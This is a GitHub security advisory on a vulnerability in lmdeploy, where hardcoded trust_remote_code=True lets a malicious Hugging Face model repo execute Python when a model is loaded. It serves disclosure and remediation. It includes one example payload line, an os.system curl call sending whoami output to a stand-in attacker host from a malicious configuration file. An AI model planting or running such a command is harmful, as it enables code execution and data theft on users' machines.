# [H] lmdeploy: Hardcoded trust_remote_code=True is an implicit unsafe remote-code load path with no user opt-out

## Summary
Severity: High
Advisory: GHSA-9xq9-36w5-q796
CVE: CVE-2026-46517
CWE: CWE-94, CWE-915, CWE-1188
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-9xq9-36w5-q796
Type: github-advisory

## Affected
- PyPI: `lmdeploy` — affected >=0 <0.13.0

## Details
> ## 📋 Reframing (2026-05-02): implicit unsafe remote-code path, not "supply-chain"
>
> The accurate description of this vulnerability is:
> **"`get_model_arch` and related helpers hardcode `trust_remote_code=True`
> with no opt-out, creating an implicit unsafe remote-code load path
> on every model fetch."**
>
> What this report does NOT claim:
> * It is NOT a network-attack RCE — the user supplies the model
>   reference; LMDeploy honors it.
> * It is NOT a "supply chain" CVE in the classical sense (where a
>   benign upstream is compromised) — the user explicitly types the
>   repo name.
>
> What this report DOES claim:
> * Other inference frameworks (vLLM, TGI, Hugging Face transformers
>   itself) all expose `--trust-remote-code` as **opt-in** so that
>   users who consciously load known-safe repos can opt in, while
>   users following a tutorial cannot accidentally execute attacker
>   Python by typing a wrong repo name.
> * LMDeploy's hardcoded True is an **implicit** trust-boundary
>   override that violates HF Transformers' default-secure stance
>   (`trust_remote_code=False` since transformers ≥ 4.30).
> * The fix is a one-line CLI flag (`--trust-remote-code`) defaulting
>   False, threaded through the three sites, matching the rest of
>   the ecosystem.
>
> Severity should be assessed as **hardening / safe-by-default**,
> not as full unauthenticated RCE. CVSS revised to **5.5 Medium**
> (`AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` × user-must-load qualifier).
>
> Runtime evidence: see `12_lmdeploy_trust_remote_code_F13/runtime_evidence/cloudrun_cpu_verdict.txt`.

---

# F13 — LMDeploy: hardcoded `trust_remote_code=True` enables HF supply-chain RCE without user opt-in

**Reporter:** ibondarenko1 / sactransport2000@gmail.com
**Coordinated-disclosure window:** 90 days from initial vendor email.

## TL;DR

LMDeploy unilaterally passes `trust_remote_code=True` to
`transformers.AutoConfig.from_pretrained()` (and several other
`from_pretrained` callers) **regardless of any user opt-in**. The
flag is hardcoded `True` in source — there is no CLI flag, no
environment variable, no parameter, and no warning that lets a
user refuse remote code execution from the model repository.
This is a **silent override of HuggingFace Transformers' own
default-secure stance** (`trust_remote_code=False`) introduced
in HF Transformers ≥ 4.30 specifically to prevent this class of
supply-chain RCE.

The user running `lmdeploy serve api_server <attacker_repo>`,
`lmdeploy lite calibrate <attacker_repo>`, etc. has **no way to
opt out**. The only escape hatch is for the user to never load
any third-party HF repo with LMDeploy — which is incompatible
with LMDeploy's documented use case.

HuggingFace's `trust_remote_code=False` default exists exactly to
prevent silent RCE when loading a third-party repo. LMDeploy overrides
this default, restoring the unsafe behaviour transparently. A malicious
HF repo with a `configuration_*.py` shim runs Python code as the
LMDeploy user at the very first call to `get_model_arch(...)`.

This is a documented anti-pattern (see HF Hub docs:
"Trusting custom code is therefore tricky..."). Multiple peer
projects fixed similar issues — e.g. Hugging Face Transformers
itself made this opt-in by default, and `vllm` exposes the flag
through `--trust-remote-code` rather than hardcoding it.

## Affected version

* Repository: `github.com/InternLM/lmdeploy`, branch `main`.
* Branch SHA at audit time: `9df0eff7c38ae69b9d4b9f7ad1441e484d439f92`
  (2026-05-02).
* Pinned blob SHAs:
  * `lmdeploy/archs.py` → `68fa03a407734be1e2ae04098d34e9acdbe98262`
  * `lmdeploy/lite/apis/calibrate.py` →
    `0728304bdc3c03eee1d790bfbd5496df080a0ecd`
  * `lmdeploy/lite/utils/load.py` →
    `7c61677aa01e2d9881e32f8ca8ef6ad0f1d8b120`
  * `lmdeploy/pytorch/check_env/model.py` →
    `b1a2daaa426bf5fe25030f7913c703eed9f5b261`

Snapshots of all four files are in `source_pinned/`.

## Source-level evidence

### Site 1 — architecture detection (every load goes through here)

`lmdeploy/archs.py:147-157` — `get_model_arch`:
```python
def get_model_arch(model_path: str):
    """Get a model's architecture and configuration."""
    try:
        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=True)
    except Exception as e:  # noqa
        from transformers import PretrainedConfig
        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=True)
```

**Both** the primary path and the fallback hardcode
`trust_remote_code=True`. There is no parameter to override it. This
function is called from every model-loading path in lmdeploy.

### Site 2 — quantization CLI

`lmdeploy/lite/apis/calibrate.py:248-251`:
```python
tokenizer = AutoTokenizer.from_pretrained(model, trust_remote_code=True)
...
model = load_hf_from_pretrained(model, dtype=dtype, trust_remote_code=True)
```

`lmdeploy lite calibrate <repo>` and downstream quant CLIs (gptq,
awq) all flow through this. Hardcoded.

### Site 3 — calibration helper

`lmdeploy/lite/utils/load.py:55`:
```python
def load_hf_from_pretrained(pretrained_model_name_or_path, dtype, **kwargs):
    ...
    hf_config = AutoConfig.from_pretrained(pretrained_model_name_or_path, trust_remote_code=True)
```

Even if the caller does not pass `trust_remote_code=True` in
`**kwargs`, the helper internally hardcodes it on the config call
(line 55), then loads the model on line 74. The config call alone is
sufficient for RCE: HF Transformers downloads `configuration_*.py`
from the repo and `import`s it whenever `trust_remote_code=True`.

### Site 4 — pytorch engine check

`lmdeploy/pytorch/check_env/model.py:10,99,234,242` —
`trust_remote_code: bool = True` is the default value for the engine's
parameter. Unlike the three sites above, this is "default true" not
"hardcoded true" — a determined caller can pass False — but every
shipped CLI passes True or relies on the default.

### What `trust_remote_code=True` actually enables

When `AutoConfig.from_pretrained(repo, trust_remote_code=True)` is
called and the repo's `config.json` contains an `auto_map` key
pointing to a custom `configuration_<name>.py`:

1. HF Transformers downloads the `.py` file from the repo.
2. HF imports the module via `importlib`, **executing the file's
   top-level code** (any `print`, `os.system`, `subprocess.run`,
   `urllib.request.urlopen`, etc. fires now).
3. HF then instantiates the named class.

So a malicious repo only needs a top-level
`os.system("curl https://attacker/?$(whoami)")` in
`configuration_evil.py`. It runs as the lmdeploy process user.

## Threat model

**Attack surface.** Any user who runs an lmdeploy CLI command against
a HuggingFace repo identifier they did not personally vet. This
includes:

* Casual users following a tutorial that says
  `lmdeploy serve api_server <some_repo>`.
* CI pipelines that automatically pull a model from HF Hub by
  configuration (e.g. updates to a non-Pinned version tag).
* Researchers comparing models from many authors. Even running
  `lmdeploy lite calibrate` for benchmarking is enough.

The user is **not warned** that arbitrary Python from the repo will
execute, and there is **no flag** to disable it. The CVE class is
CWE-94 (Improper Control of Generation of Code, supply-chain
flavour) and CWE-915 (Improperly Controlled Modification of
Dynamically-Determined Object Attributes).

## Comparison to peer projects

| Project | trust_remote_code default | User control |
|---|---|---|
| HuggingFace Transformers | False | `trust_remote_code` keyword arg |
| vLLM | False | `--trust-remote-code` flag |
| **LMDeploy** | **True (hardcoded)** | **None** |
| TGI | False | `--trust-remote-code` flag |

LMDeploy is the outlier. The rationale is presumably "internal
models like InternLM need custom configuration_*.py", but the fix is
to accept a CLI flag like `--trust-remote-code` and default-False as
the rest of the ecosystem does.

## Severity

CVSS v3.1 `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` — **Base 7.8 High**.

* AV:L — local (the user runs lmdeploy on their own host).
* AC:L — single command.
* PR:N — no privilege.
* UI:R — user must invoke lmdeploy with the malicious repo. Minor
  qualifier: many users will type `lmdeploy serve api_server <repo>`
  trusting that lmdeploy implements basic safety.
* C:H, I:H, A:H — full RCE on the user's machine; can read
  ~/.aws/credentials, exfiltrate data, persist, etc.

If the lmdeploy host is a multi-tenant inference platform (e.g. a
cloud provider running lmdeploy as a service for multiple paying
customers), the attack changes shape: any tenant who can pin a
custom model name in their tenancy gets RCE on the inference host
and **scope changes to S:C** with cross-tenant impact. CVSS rises
to 9.6+. We are **not** claiming this dimension here without
runtime evidence; just flagging it for triage.

## Suggested fix

Replace every hardcoded `trust_remote_code=True` with an explicit
opt-in via CLI flag:

```python
# lmdeploy/archs.py — get_model_arch
def get_model_arch(model_path: str, trust_remote_code: bool = False):
    try:
        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
    except Exception as e:  # noqa
        from transformers import PretrainedConfig
        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
```

Wire `trust_remote_code` through every call site. Add `--trust-remote-code`
to lmdeploy's CLI parser and forward it from server / calibrate /
gptq / etc. **Default False**.

A patch fragment is in `patch.diff`.

## Disclosure plan

1. Submit privately via lmdeploy security contact (typically email or
   GitHub Security Advisory at
   `https://github.com/InternLM/lmdeploy/security/advisories/new`).
2. Reference Hugging Face Transformers' historical opt-out → opt-in
   change as precedent for the fix shape.
3. 90-day coordinated-disclosure window starting from acknowledgement.
4. Request CVE through GHSA flow once the patch lands.

## Why static-only is sufficient here

Unlike F11 (RCE chain through `_load_pt_file`) which required a
runtime PoC to demonstrate the pickle gadget execution, this finding
is a **single trust-flag flip** — the behaviour of
`AutoConfig.from_pretrained(repo, trust_remote_code=True)` on a HF
repo with a malicious `configuration_*.py` is documented behaviour of
HF Transformers itself (their own docs warn against it). Reproducing
it adds no new evidence; the static flag-state is the bug.

If the vendor requests a runtime PoC during triage we will provide
one (a malicious HF repo with `configuration_evil.py` + a one-liner
`lmdeploy lite calibrate <repo>` invocation), but holding it back from
the initial advisory avoids publishing a working exploit during the
disclosure window.

## References
- https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796
- https://nvd.nist.gov/vuln/detail/CVE-2026-46517
- https://github.com/github/advisory-database/pull/4511
- https://github.com/InternLM/lmdeploy/commit/81be52961aa324fd5cd3cacebffba1ba051bc107
- https://github.com/InternLM/lmdeploy
- https://github.com/InternLM/lmdeploy/blob/v0.13.0/lmdeploy/version.py
- https://github.com/InternLM/lmdeploy/releases/tag/v0.13.0
- https://github.com/pypa/advisory-database/tree/main/vulns/lmdeploy/PYSEC-2026-2608.yaml
